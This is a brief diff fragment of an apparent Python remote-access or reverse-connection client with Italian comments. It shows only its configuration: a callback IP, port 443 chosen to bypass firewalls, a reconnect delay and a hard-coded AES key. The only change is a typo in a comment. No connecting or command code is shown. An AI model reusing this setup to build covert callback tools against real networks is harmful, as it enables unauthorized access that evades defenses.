@@ -9,7 +9,7 @@ import base64
 import random
 
 # ===== CONFIGURAZIONE =====
-SERVER_IP = "192.168.1.100"  # Cambia con il tuo IP (consenso obbligatorio!)
+SERVER_IP = "192.168.1.100"  # Cambia on il tuo IP (consenso obbligatorio!)
 SERVER_PORT = 443             # Porta comune per bypassare firewall
 RECONNECT_DELAY = 10          # Tentativi di riconnessione (secondi)
 AES_KEY = b"supersecretkey123"  # Chiave AES a 16/24/32 byte
